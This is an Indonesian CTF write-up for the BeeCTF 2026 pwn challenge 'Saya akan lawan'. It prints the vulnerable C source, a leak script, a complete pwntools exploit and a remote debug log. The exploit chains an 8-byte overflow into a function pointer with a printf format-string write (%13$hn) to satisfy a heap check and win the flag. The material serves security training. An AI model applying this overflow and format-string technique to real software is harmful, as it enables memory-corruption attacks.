---
slug: "pwn-saya-akan-lawan"
title: "Saya akan lawan"
competition: "BeeCTF 2026"
category: "Pwn"
difficulty: "Easy"
date: "2026-08-22"
updated: "2026-08-24"
summary: "Owi terus dihujat netizen, tetapi ia tetap diam. Entah sampai kapan kesabarannya bertahan. Author: pecinta jamu nc 103.185.52.197 5010 I failed to firstblood this challenge because distracted.."
tags: ["PWN","RET2LIBC","CALL2PLT","FORMAT STRING","HEAP","PIE","X64","EASY","MEDIUM"]
status: "published"
flag: "BeeCTF{s4y4_s3b3tulny4_sud4h_d14m_4_5_t4hun_d1f1tn4h_s4y4_d14m_d1huj4t_s4y4_d14m_t4p1_h4r1_1n1_s4y4_4k4n_l4w4n}"
attachments: []
source: "https://claritys.web.id/writeups/pwn-saya-akan-lawan"
---

# Saya akan lawan

> Owi terus dihujat netizen, tetapi ia tetap diam. Entah sampai kapan kesabarannya bertahan. Author: pecinta jamu nc 103.185.52.197 5010  I failed to firstblood this challenge because distracted..

![](/assets/uploads/a12a835b-289b-40e4-8465-f6f97d7ea361-screenshot_2026-08-24_10-19-03.png)

* * *

Kita diberi file dist.zip yang isinya ada banyak.

```bash
~/ctf/beectf/pwn/sayaakanlawan/wu
❯ unzip dist.zip                                                                 󰥔 20:36:34
Archive:  dist.zip
  inflating: chall
  inflating: chall.c
  inflating: bot.c
  inflating: bot.h
  inflating: setup.c
  inflating: setup.h
  inflating: libc.so.6
  inflating: ld-linux-x86-64.so.2
```

isi bot.c

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "bot.h"

void show_tank(void);

struct Bot bot = {
    "@budi reacted 💀 to your post",
    show_tank,
};

void bot_react(struct Bot *bot)
{
    const char *names[] = {"budi", "siti", "agus", "dewi", "eko"};
    const char *reacts[] = {"💀", "😂", "🤣"};
    int name_idx;
    int react_idx;

    name_idx = rand() % 5;
    react_idx = rand() % 3;

    snprintf(
        bot->reaction,
        sizeof(bot->reaction),
        "@%s reacted %s to your post",
        names[name_idx],
        reacts[react_idx]
    );

    usleep(1000000);
    write(1, bot->reaction, sizeof(bot->reaction) + sizeof(bot->view));
    puts("");
}
```

isi chall.c

```c
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>

#include "bot.h"
#include "setup.h"

#define BUZZER 0x1337

struct Phone {
    char name[32];
    int (*post)(const char *);
};

struct Phone phone;

int buzzer_phone_active(int *hp_buzzer)
{
    unsigned short siuuu;

    if (hp_buzzer == NULL) {
        return 0;
    }

    siuuu = BUZZER ^ ((uintptr_t)hp_buzzer >> 12);
    return *hp_buzzer == siuuu;
}

void show_tank(void)
{
    int bars = saya_akan_lawan->patience / 10;

    printf("\nOwi's patience\n[");

    for (int i = 0; i < 10; i++) {
        if (i < bars) {
            putchar('#');
        } else {
            putchar('-');
        }
    }

    printf("] %d%%\n", saya_akan_lawan->patience);
}

void take_phone(void)
{
    if (saya_akan_lawan->phones_taken >= 2) {
        puts("There are no more phones.");
        return;
    }

    if (saya_akan_lawan->phones_taken == 1 &&
        saya_akan_lawan->patience != 80) {
        puts("Use your current phone first.");
        return;
    }

    if (saya_akan_lawan->phones_taken == 1) {
        puts("You check your phone again.");
    } else {
        puts("");
        puts("You found a normal phone.");
    }

    update_state(&saya_akan_lawan->phones_taken, 1);
    phone.post = puts;

    puts("Give your phone a name:");
    printf("> ");
    read(0, phone.name, 40);
}

void publish_insult(const char *text)
{
    phone.post(text);
    update_state(&saya_akan_lawan->patience, -20);
}

void insult(int *hp_buzzer)
{
    char user_input[16];
    char flag[128];
    FILE *file;
    ssize_t length;

    if (saya_akan_lawan->phones_taken == 0) {
        puts("Take the phone first.");
        return;
    }

    if (!buzzer_phone_active(hp_buzzer) &&
        saya_akan_lawan->patience <= 40) {
        puts("Your phone cannot post any more insults.");
        return;
    }

    puts("");
    puts("Write an insult:");
    printf("> ");

    length = read(
        0,
        user_input,
        sizeof(user_input) - 1
    );

    if (length <= 0) {
        return;
    }

    user_input[length] = '\0';

    puts("");
    puts("Netizen posted:");

    publish_insult(user_input);
    bot_react(&bot);

    usleep(1500000);
    show_tank();

    if (buzzer_phone_active(hp_buzzer)) {
        puts("[BUZZER PHONE ACTIVE]");
        puts("Insult limit: UNLIMITED");
    }

    if (saya_akan_lawan->patience == 80) {
        puts("\"4,5 tahun saya difitnah-fitnah, saya diam.\"");
    }

    if (saya_akan_lawan->patience == 60) {
        puts("\"Dijelek-jelekin, saya juga diam.\"");
    }

    if (saya_akan_lawan->patience == 40) {
        puts("\"Dicela, direndah-rendahkan, saya juga diam.\"");
    }

    if (saya_akan_lawan->patience == 20) {
        puts("\"Dihujat-hujat, dihina-hina, saya juga diam.\"");
    }

    if (saya_akan_lawan->patience == 0 &&
        buzzer_phone_active(hp_buzzer)) {
        puts(
            "\"Tetapi hari ini di Jogja saya sampaikan: "
            "saya akan lawan!\""
        );
        puts("\"Ingat sekali lagi, saya akan lawan!\"");
        puts("");

        file = fopen("flag.txt", "r");

        if (file == NULL) {
            puts("Flag file not found.");
            exit(1);
        }

        if (fgets(flag, sizeof(flag), file) == NULL) {
            puts("Could not read the flag.");
            fclose(file);
            exit(1);
        }

        fclose(file);

        printf("%s", flag);
        exit(0);
    }
}

int main(void)
{
    int choice;
    int *hp_buzzer;

    hp_buzzer = setup();

    puts("====================================");
    puts("          OWI'S PATIENCE TANK");
    puts("====================================");

    while (1) {
        puts("");
        puts("1. Take phone");
        puts("2. Insult Owi");
        puts("3. Leave");
        printf("> ");

        if (scanf("%d%*c", &choice) != 1) {
            exit(0);
        }

        if (choice == 1) {
            take_phone();
        }

        if (choice == 2) {
            insult(hp_buzzer);
        }

        if (choice == 3) {
            exit(0);
        }
    }
}
```

isi setup.c

```c
#include <errno.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>
#include <linux/audit.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
#include <linux/unistd.h>
#include <sys/prctl.h>

#include "setup.h"

#define STATE_SIZE 0x1000

struct State *saya_akan_lawan;

static void sandbox(void)
{
    struct sock_filter filter[] = {
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, arch)),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, AUDIT_ARCH_X86_64, 1, 0),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),

        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr)),
        BPF_JUMP(BPF_JMP | BPF_JGE | BPF_K, 0x40000000, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),

        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_execve, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ERRNO | EPERM),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_execveat, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ERRNO | EPERM),

        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
    };
    struct sock_fprog program = {
        .len = sizeof(filter) / sizeof(filter[0]),
        .filter = filter,
    };

    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) == -1) {
        exit(1);
    }

    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &program) == -1) {
        exit(1);
    }
}

void update_state(int *value, int amount)
{
    if (mprotect(saya_akan_lawan, STATE_SIZE,
                 PROT_READ | PROT_WRITE) == -1) {
        exit(1);
    }

    *value += amount;

    if (mprotect(saya_akan_lawan, STATE_SIZE, PROT_READ) == -1) {
        exit(1);
    }
}

int *setup(void)
{
    int *hp_buzzer;

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    srand(time(NULL) ^ getpid());

    saya_akan_lawan = mmap(
        NULL,
        STATE_SIZE,
        PROT_READ | PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS,
        -1,
        0
    );
    if (saya_akan_lawan == MAP_FAILED) {
        exit(1);
    }

    saya_akan_lawan->patience = 100;
    if (mprotect(saya_akan_lawan, STATE_SIZE, PROT_READ) == -1) {
        exit(1);
    }

    hp_buzzer = calloc(1, sizeof(*hp_buzzer));
    if (hp_buzzer == NULL) {
        exit(1);
    }

    sandbox();
    return hp_buzzer;
}
```

Pertama-tama kita checksec challnya.

```bash
~/ctf/beectf/pwn/sayaakanlawan
❯ checksec file chall                                                            󰥔 20:32:17

  _____ _    _ ______ _____ _  __ _____ ______ _____
 / ____| |  | |  ____/ ____| |/ // ____|  ____/ ____|
| |    | |__| | |__ | |    | ' /| (___ | |__ | |
| |    |  __  |  __|| |    |  <  \___ \|  __|| |
| |____| |  | | |___| |____| . \ ____) | |___| |____
 \_____|_|  |_|______\_____|_|\_\_____/|______\_____|

RELRO       Stack Canary  CFI          NX          PIE          RPATH     RUNPATH     Symbols     SafeStack           Stack Clash  W^X Seg  Selfrando     Sanitizers  FORTIFY Lvl  GLIBCXX Assert  FORTIFY  Fortified  Fortifiable  Name
Full RELRO  Canary Found  SHSTK & IBT  NX enabled  PIE Enabled  No RPATH  No RUNPATH  72 symbols  No SafeStack Found  No Probes    Enabled  No Selfrando  None        Unknown      Unknown         No       0          2            chall
```

Setelah memahami source codenya, ada buffer overflow di:

```
    update_state(&saya_akan_lawan->phones_taken, 1);
    phone.post = puts;

    puts("Give your phone a name:");
    printf("> ");
    read(0, phone.name, 40);
}
```

Karena si name itu sizenya 32:

```
struct Phone {
    char name[32];
    int (*post)(const char *);
};

struct Phone phone;
```

Jadi ada overflow 8 byte, yang di mana bisa overwrite `phone.post` (function pointer).

Nah, karena si [phone.post](http://phone.post) itu adalah puts, kita bisa mengubahnya menjadi `printf` yang nanti membuka peluang format string vulnerability.

Jadi cara sementara kita solve adalah

1.  Leak PIE/base address
    

2.  Overwrite printf
    

3.  Terus leak heapnya.
    

4.  Terus kita trigger cara dapetin flagnya yaitu `Patience` harus 0 dan `hp_buzzer` harus`valid`.
    

di sini aku ngeleaknya pakai script ini:

```python
from pwn import *

elf = ELF("./chall_patched", checksec=False)

def one(pos):
    p = process("./chall_patched")
    p.recvuntil(b"> ")

    p.sendline(b"1")
    p.recvuntil(b"> ")
    p.send(b"A" * 32)
    p.recvuntil(b"> ")

    p.sendline(b"2")
    p.recvuntil(b"> ")
    p.sendline(b"x")
    out = p.recvuntil(b"> ", timeout=6)
    line = next(l for l in out.split(b"\n") if l.startswith(b"@"))
    pie = u64(line[40:48]) - elf.sym.show_tank

    heap = next(m for m in open(f"/proc/{p.pid}/maps").read().splitlines()
                if "[heap]" in m)

    p.sendline(b"1")
    p.recvuntil(b"> ")
    p.send(b"B" * 32 + p64(pie + elf.plt.printf))
    p.recvuntil(b"> ")

    p.sendline(b"2")
    p.recvuntil(b"> ")
    p.sendline(f"%{pos}$p".encode())
    out = p.recvuntil(b"@", timeout=6)
    val = out.split(b"Netizen posted:\n", 1)[1].split(b"\n", 1)[0]
    p.close()
    return heap, val

for i in range(1, 21):
    heap, val = one(i)
    print(i, val.decode(), heap)
```

Output:

```
[+] Starting local process './chall_patched': pid 2971914
[*] Stopped process './chall_patched' (pid 2971914)
1 0x7f363a004643 561be1f0f000-561be1f30000 rw-p 00000000 00:00 0                          [heap]
[+] Starting local process './chall_patched': pid 2972045
[*] Stopped process './chall_patched' (pid 2972045)
2 0x55b9712ee204 55b98f9e2000-55b98fa03000 rw-p 00000000 00:00 0                          [heap]
[+] Starting local process './chall_patched': pid 2972296
[*] Stopped process './chall_patched' (pid 2972296)
3 0x7f24a2b1c6a4 559194b4d000-559194b6e000 rw-p 00000000 00:00 0                          [heap]
[+] Starting local process './chall_patched': pid 2972474
[*] Stopped process './chall_patched' (pid 2972474)
4 0xf 5654dd334000-5654dd355000 rw-p 00000000 00:00 0                          [heap]
[+] Starting local process './chall_patched': pid 2972631
[*] Stopped process './chall_patched' (pid 2972631)
5 0x1 55fbc28e7000-55fbc2908000 rw-p 00000000 00:00 0                          [heap]
[+] Starting local process './chall_patched': pid 2972789
[*] Stopped process './chall_patched' (pid 2972789)
6 0x1 55c389cb8000-55c389cd9000 rw-p 00000000 00:00 0                          [heap]
[+] Starting local process './chall_patched': pid 2972986
[*] Stopped process './chall_patched' (pid 2972986)
7 0x7ffd0e6f5080 55b1292b9000-55b1292da000 rw-p 00000000 00:00 0                          [heap]
[+] Starting local process './chall_patched': pid 2973168
[*] Stopped process './chall_patched' (pid 2973168)
8 0x55fcc19f1d18 55fcdc184000-55fcdc1a5000 rw-p 00000000 00:00 0                          [heap]
[+] Starting local process './chall_patched': pid 2973336
[*] Stopped process './chall_patched' (pid 2973336)
9 0x18fe6f3916d8b600 55a860a9b000-55a860abc000 rw-p 00000000 00:00 0                          [heap]
[+] Starting local process './chall_patched': pid 2973514
[*] Stopped process './chall_patched' (pid 2973514)
10 0x7ffddae8eae0 565380ffa000-56538101b000 rw-p 00000000 00:00 0                          [heap]
[+] Starting local process './chall_patched': pid 2973720
[*] Stopped process './chall_patched' (pid 2973720)
11 0x5599c2146794 5599d216a000-5599d218b000 rw-p 00000000 00:00 0                          [heap]
[+] Starting local process './chall_patched': pid 2973856
[*] Stopped process './chall_patched' (pid 2973856)
12 0x7fff0b26a610 560897093000-5608970b4000 rw-p 00000000 00:00 0                          [heap]
[+] Starting local process './chall_patched': pid 2974038
[*] Stopped process './chall_patched' (pid 2974038)
13 0x5556f02e82a0 5556f02e8000-5556f0309000 rw-p 00000000 00:00 0                          [heap]
[+] Starting local process './chall_patched': pid 2974217
[*] Stopped process './chall_patched' (pid 2974217)
14 0x6 55c1ba61a000-55c1ba63b000 rw-p 00000000 00:00 0                          [heap]
[+] Starting local process './chall_patched': pid 2974331
[*] Stopped process './chall_patched' (pid 2974331)
15 0x7ffe98f31c9c 55c2fc2e8000-55c2fc309000 rw-p 00000000 00:00 0                          [heap]
[+] Starting local process './chall_patched': pid 2974554
[*] Stopped process './chall_patched' (pid 2974554)
16 0xa7024363125 55d64b102000-55d64b123000 rw-p 00000000 00:00 0                          [heap]
[+] Starting local process './chall_patched': pid 2974794
[*] Stopped process './chall_patched' (pid 2974794)
17 (nil) 55a0eae27000-55a0eae48000 rw-p 00000000 00:00 0                          [heap]
[+] Starting local process './chall_patched': pid 2974935
[*] Stopped process './chall_patched' (pid 2974935)
18 0x2 55d374ffa000-55d37501b000 rw-p 00000000 00:00 0                          [heap]
[+] Starting local process './chall_patched': pid 2975111
[*] Stopped process './chall_patched' (pid 2975111)
19 0x1 563b68631000-563b68652000 rw-p 00000000 00:00 0                          [heap]
[+] Starting local process './chall_patched': pid 2975308
[*] Stopped process './chall_patched' (pid 2975308)
20 0x7ffe7e2071c0 5641c0081000-5641c00a2000 rw-p 00000000 00:00 0                          [heap]
```

Nah, aku melihat address yang mirip heap di leak ke 13, yaitu `0x5556f02e82a0`. Karena address heap itu sering akhir akhirannya itu 0.

Nah setelah kita tau kalau leak ke 13 itu heap, kita tinggal mencari cara biar bisa trigger flagnya.

Nah sebelum kesitu, kita pahami dulu function buzzernya. Karena dia merupakan kunci biar kita bisa lanjut insult hingga unlimited.

```
int buzzer_phone_active(int *hp_buzzer)
{
    unsigned short siuuu;

    if (hp_buzzer == NULL) {
        return 0;
    }

    siuuu = BUZZER ^ ((uintptr_t)hp_buzzer >> 12);
    return *hp_buzzer == siuuu;
}
```

dikarenakan `hp_buzzer` adalah pointer heap dari `calloc`, jadi nanti kita bisa make leak yang ke 13 tadi sebagai address si `hp_buzzer`.

Agar buzzer aktif, memory di `hp_buzzer` harus sama dengan:

```
(0x1337 ^ (hp_buzzer >> 12)) & 0xffff
```

Kenapa `& 0xffff`? Karena `siuuu` bertipe `unsigned short`, jadi hasil XOR dipotong ke 16-bit.

Dari format string, `%13$p` leak pointer `hp_buzzer`, terus nanti pakai `%13$hn` untuk menulis value buzzer yang valid karena target value adalah 16-bit `unsigned short siuuu;`. Setelah buzzer aktif, insult sampai patience `0`, lalu binary sendiri membaca `flag.txt`.

Yang nanti akhirnya, kita akan mengirim ini: `f"%{target}c%{hp_off}$hn"`

Yang di mana nanti printf mencetak token karakter, terus `%13$hn` menulis token sebagai unsigned short ke \*(argumen ke-13) dan argumen ke-13 adalah `hp_buzzer`. Biar nanti kita dapat buzzer phone unlimited.

```python
#!/usr/bin/env python3
from pwn import *
import re

elf = ELF("./chall", checksec=False)
context.log_level = 'debug'

p = process("./chall")

# 1. Leak PIE
p.recvuntil(b"> ")
p.sendline(b"1")
p.recvuntil(b"> ")
p.sendline(b"phone")
p.recvuntil(b"> ")
p.sendline(b"2")
p.recvuntil(b"> ")
p.sendline(b"x")
out = p.recvuntil(b"> ", timeout=6)
line = next(l for l in out.split(b"\n") if l.startswith(b"@"))
pie = u64(line[40:48]) - elf.sym.show_tank
log.success(f"PIE: {hex(pie)}")
elf.address = pie

# 2. Overwrite printf
p.sendline(b"1")
p.recvuntil(b"> ")
payload = b"B"*32 + p64(elf.plt['printf'])
p.send(payload)
p.send(b"\n")
p.recvuntil(b"> ")

# 3. Cari hp di offset 13
p.sendline(b"2")
p.recvuntil(b"> ")
p.sendline(b"%11$p%12$p%13$p")
out = p.recvuntil(b"> ", timeout=6)
ptrs = re.findall(rb'0x[0-9a-f]{12}', out)
if len(ptrs) < 3:
    log.error("Tidak cukup pointer")
    p.close()
    exit()

with open(f"/proc/{p.pid}/maps") as f:
    for line in f:
        if "[heap]" in line:
            heap_base = int(line.split("-")[0], 16)
            break
    else:
        raise Exception("Heap not found")
log.info(f"Heap base: {hex(heap_base)}")

hp = int(ptrs[2], 16)
if not (heap_base <= hp < heap_base + 0x1000):
    log.error("Offset 13 bukan heap")
    p.close()
    exit()
hp_off = 13
log.success(f"hp_buzzer: {hex(hp)} offset {hp_off}")

target = (0x1337 ^ ((hp >> 12) & 0xFFFF)) & 0xFFFF
log.info(f"Target: {hex(target)} (decimal: {target})")

# 4. Tulis target ke *hp_buzzer
p.sendline(b"2")
p.recvuntil(b"> ")
fmt = f"%{target}c%{hp_off}$hn".encode()
log.info(f"Format string: {fmt}")
p.sendline(fmt)

# 5. Dua insult lagi untuk mencapai patience 0
for _ in range(2):
    p.sendline(b"2")
    p.recvuntil(b"> ")
    p.sendline(b"a")
    out = p.recvuntil(b"> ", timeout=6)
    if b"flag" in out:
        log.success("Flag ditemukan!")
        print(out.decode())
        p.close()
        exit()

# 6. Jika belum dapat flag, ambil sisa output
print(p.recvall().decode())
p.close()
```

Implement:

```bash
~/ctf/beectf/pwn/sayaakanlawan 14s
❯ python3 solve.py remote 103.185.52.197 5010                                    󰥔 15:06:20
[+] Opening connection to 103.185.52.197 on port 5010: Done
[DEBUG] Received 0x24 bytes:
    b'=' * 0x24
[DEBUG] Received 0x6c bytes:
    b'\n'
    b"          OWI'S PATIENCE TANK\n"
    b'====================================\n'
    b'\n'
    b'1. Take phone\n'
    b'2. Insult Owi\n'
    b'3. Leave\n'
    b'> '
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x1 bytes:
    b'\n'
[DEBUG] Received 0x34 bytes:
    b'You found a normal phone.\n'
    b'Give your phone a name:\n'
    b'> '
[DEBUG] Sent 0x6 bytes:
    b'phone\n'
[DEBUG] Received 0x1 bytes:
    b'\n'
[DEBUG] Received 0x27 bytes:
    b'1. Take phone\n'
    b'2. Insult Owi\n'
    b'3. Leave\n'
    b'> '
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x1 bytes:
    b'\n'
[DEBUG] Received 0x13 bytes:
    b'Write an insult:\n'
    b'> '
[DEBUG] Sent 0x2 bytes:
    b'x\n'
[DEBUG] Received 0x1 bytes:
    b'\n'
[DEBUG] Received 0x13 bytes:
    b'Netizen posted:\n'
    b'x\n'
    b'\n'
[DEBUG] Received 0x30 bytes:
    00000000  40 61 67 75  73 20 72 65  61 63 74 65  64 20 f0 9f  │@agu│s re│acte│d ··│
    00000010  92 80 20 74  6f 20 79 6f  75 72 20 70  6f 73 74 00  │·· t│o yo│ur p│ost·│
    00000020  00 00 00 00  00 00 00 00  3e 44 1a 47  cc 64 00 00  │····│····│>D·G│·d··│
    00000030
[DEBUG] Received 0x1 bytes:
    b'\n'
[DEBUG] Received 0x11 bytes:
    b'\n'
    b"Owi's patience\n"
    b'['
[DEBUG] Received 0x65 bytes:
    b'########--] 80%\n'
    b'"4,5 tahun saya difitnah-fitnah, saya diam."\n'
    b'\n'
    b'1. Take phone\n'
    b'2. Insult Owi\n'
    b'3. Leave\n'
    b'> '
[+] PIE: 0x64cc471a3000
[DEBUG] Sent 0x2 bytes:
    b'1\n'
[DEBUG] Received 0x1b bytes:
    b'You check your phone again.'
[DEBUG] Received 0x1b bytes:
    b'\n'
    b'Give your phone a name:\n'
    b'> '
[DEBUG] Sent 0x28 bytes:
    00000000  42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│
    *
    00000020  04 42 1a 47  cc 64 00 00                            │·B·G│·d··│
    00000028
[DEBUG] Sent 0x1 bytes:
    b'\n'
[DEBUG] Received 0x1 bytes:
    b'\n'
[DEBUG] Received 0x27 bytes:
    b'1. Take phone\n'
    b'2. Insult Owi\n'
    b'3. Leave\n'
    b'> '
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x1 bytes:
    b'\n'
[DEBUG] Received 0x13 bytes:
    b'Write an insult:\n'
    b'> '
[DEBUG] Sent 0x10 bytes:
    b'%11$p%12$p%13$p\n'
[DEBUG] Received 0x1 bytes:
    b'\n'
[DEBUG] Received 0x3a bytes:
    b'Netizen posted:\n'
    b'0x64cc471a47940x7ffedd2335f00x64cc4819a2a0'
[DEBUG] Received 0x30 bytes:
    00000000  40 64 65 77  69 20 72 65  61 63 74 65  64 20 f0 9f  │@dew│i re│acte│d ··│
    00000010  a4 a3 20 74  6f 20 79 6f  75 72 20 70  6f 73 74 00  │·· t│o yo│ur p│ost·│
    00000020  00 00 00 00  00 00 00 00  3e 44 1a 47  cc 64 00 00  │····│····│>D·G│·d··│
    00000030
[DEBUG] Received 0x1 bytes:
    b'\n'
[DEBUG] Received 0x11 bytes:
    b'\n'
    b"Owi's patience\n"
    b'['
[DEBUG] Received 0x5b bytes:
    b'######----] 60%\n'
    b'"Dijelek-jelekin, saya juga diam."\n'
    b'\n'
    b'1. Take phone\n'
    b'2. Insult Owi\n'
    b'3. Leave\n'
    b'> '
[+] hp_buzzer: 0x64cc4819a2a0
[*] Target: 0x92ad (decimal: 37549)
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x1 bytes:
    b'\n'
[DEBUG] Received 0x13 bytes:
    b'Write an insult:\n'
    b'> '
[DEBUG] Sent 0xe bytes:
    b'%37549c%13$hn\n'
[DEBUG] Received 0x1 bytes:
    b'\n'
[DEBUG] Received 0x1000 bytes:
    b'Netizen posted:\n'
    b'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                '
[DEBUG] Received 0x1000 bytes:
    b' ' * 0x1000
[DEBUG] Received 0xf64 bytes:
    b' ' * 0xf64
[DEBUG] Received 0x544 bytes:
    b' ' * 0x544
[DEBUG] Received 0xa88 bytes:
    b' ' * 0xa88
[DEBUG] Received 0x1000 bytes:
    b' ' * 0x1000
[DEBUG] Received 0x1000 bytes:
    b' ' * 0x1000
[DEBUG] Received 0x1000 bytes:
    b' ' * 0x1000
[DEBUG] Received 0x1000 bytes:
    b' ' * 0x1000
[DEBUG] Received 0x1000 bytes:
    b' ' * 0x1000
[DEBUG] Received 0x38e bytes:
    b'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            C\n'
[DEBUG] Received 0x30 bytes:
    00000000  40 64 65 77  69 20 72 65  61 63 74 65  64 20 f0 9f  │@dew│i re│acte│d ··│
    00000010  a4 a3 20 74  6f 20 79 6f  75 72 20 70  6f 73 74 00  │·· t│o yo│ur p│ost·│
    00000020  00 00 00 00  00 00 00 00  3e 44 1a 47  cc 64 00 00  │····│····│>D·G│·d··│
    00000030
[DEBUG] Received 0x1 bytes:
    b'\n'
[DEBUG] Received 0x11 bytes:
    b'\n'
    b"Owi's patience\n"
    b'['
[DEBUG] Received 0x94 bytes:
    b'####------] 40%\n'
    b'[BUZZER PHONE ACTIVE]\n'
    b'Insult limit: UNLIMITED\n'
    b'"Dicela, direndah-rendahkan, saya juga diam."\n'
    b'\n'
    b'1. Take phone\n'
    b'2. Insult Owi\n'
    b'3. Leave\n'
    b'> '
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x1 bytes:
    b'\n'
[DEBUG] Received 0x13 bytes:
    b'Write an insult:\n'
    b'> '
[DEBUG] Sent 0x2 bytes:
    b'a\n'
[DEBUG] Received 0x1 bytes:
    b'\n'
[DEBUG] Received 0x12 bytes:
    b'Netizen posted:\n'
    b'a\n'
[DEBUG] Received 0x30 bytes:
    00000000  40 61 67 75  73 20 72 65  61 63 74 65  64 20 f0 9f  │@agu│s re│acte│d ··│
    00000010  92 80 20 74  6f 20 79 6f  75 72 20 70  6f 73 74 00  │·· t│o yo│ur p│ost·│
    00000020  00 00 00 00  00 00 00 00  3e 44 1a 47  cc 64 00 00  │····│····│>D·G│·d··│
    00000030
[DEBUG] Received 0x1 bytes:
    b'\n'
[DEBUG] Received 0x11 bytes:
    b'\n'
    b"Owi's patience\n"
    b'['
[DEBUG] Received 0x94 bytes:
    b'##--------] 20%\n'
    b'[BUZZER PHONE ACTIVE]\n'
    b'Insult limit: UNLIMITED\n'
    b'"Dihujat-hujat, dihina-hina, saya juga diam."\n'
    b'\n'
    b'1. Take phone\n'
    b'2. Insult Owi\n'
    b'3. Leave\n'
    b'> '
[DEBUG] Sent 0x2 bytes:
    b'2\n'
[DEBUG] Received 0x1 bytes:
    b'\n'
[DEBUG] Received 0x13 bytes:
    b'Write an insult:\n'
    b'> '
[DEBUG] Sent 0x2 bytes:
    b'a\n'
[DEBUG] Received 0x1 bytes:
    b'\n'
[DEBUG] Received 0x12 bytes:
    b'Netizen posted:\n'
    b'a\n'
[DEBUG] Received 0x30 bytes:
    00000000  40 73 69 74  69 20 72 65  61 63 74 65  64 20 f0 9f  │@sit│i re│acte│d ··│
    00000010  92 80 20 74  6f 20 79 6f  75 72 20 70  6f 73 74 00  │·· t│o yo│ur p│ost·│
    00000020  00 00 00 00  00 00 00 00  3e 44 1a 47  cc 64 00 00  │····│····│>D·G│·d··│
    00000030
[DEBUG] Received 0x1 bytes:
    b'\n'
[DEBUG] Received 0x11 bytes:
    b'\n'
    b"Owi's patience\n"
    b'['
[DEBUG] Received 0x10f bytes:
    b'----------] 0%\n'
    b'[BUZZER PHONE ACTIVE]\n'
    b'Insult limit: UNLIMITED\n'
    b'"Tetapi hari ini di Jogja saya sampaikan: saya akan lawan!"\n'
    b'"Ingat sekali lagi, saya akan lawan!"\n'
    b'\n'
    b'BeeCTF{s4y4_s3b3tulny4_sud4h_d14m_4_5_t4hun_d1f1tn4h_s4y4_d14m_d1huj4t_s4y4_d14m_t4p1_h4r1_1n1_s4y4_4k4n_l4w4n}'
Traceback (most recent call last):
  File "/home/claritys/ctf/beectf/pwn/sayaakanlawan/solve.py", line 83, in <module>
    main()
    ~~~~^^
  File "/home/claritys/ctf/beectf/pwn/sayaakanlawan/solve.py", line 79, in main
    solve(io, elf)
    ~~~~~^^^^^^^^^
  File "/home/claritys/ctf/beectf/pwn/sayaakanlawan/solve.py", line 62, in solve
    out = io.recvuntil(b"> ", timeout=6)
  File "/usr/lib/python3.14/site-packages/pwnlib/tubes/tube.py", line 381, in recvuntil
    res = self.recv(timeout=self.timeout)
  File "/usr/lib/python3.14/site-packages/pwnlib/tubes/tube.py", line 146, in recv
    return self._recv(numb, timeout) or b''
           ~~~~~~~~~~^^^^^^^^^^^^^^^
  File "/usr/lib/python3.14/site-packages/pwnlib/tubes/tube.py", line 216, in _recv
    if not self.buffer and not self._fillbuffer(timeout):
                               ~~~~~~~~~~~~~~~~^^^^^^^^^
  File "/usr/lib/python3.14/site-packages/pwnlib/tubes/tube.py", line 195, in _fillbuffer
    data = self.recv_raw(self.buffer.get_fill_size())
  File "/usr/lib/python3.14/site-packages/pwnlib/tubes/sock.py", line 56, in recv_raw
    raise EOFError
EOFError
[*] Closed connection to 103.185.52.197 port 5010
```

#### Link AI:

**Work:** [**https://chat.deepseek.com/share/bcp34knr266tmz1xxd**](https://chat.deepseek.com/share/bcp34knr266tmz1xxd)

**Didn't work:** [**https://chat.deepseek.com/share/vw96q2bsngicborgeg**](https://chat.deepseek.com/share/vw96q2bsngicborgeg)
